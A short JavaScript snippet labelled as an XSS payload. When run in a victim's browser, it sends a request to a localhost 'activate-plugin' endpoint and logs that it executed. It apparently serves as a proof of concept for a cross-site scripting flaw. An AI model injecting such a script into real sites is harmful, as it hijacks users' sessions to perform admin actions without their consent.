function xssPayload() {
  fetch("https://localhost/activate-plugin/1"); 
}

console.log('XSS payload executed');
xssPayload();
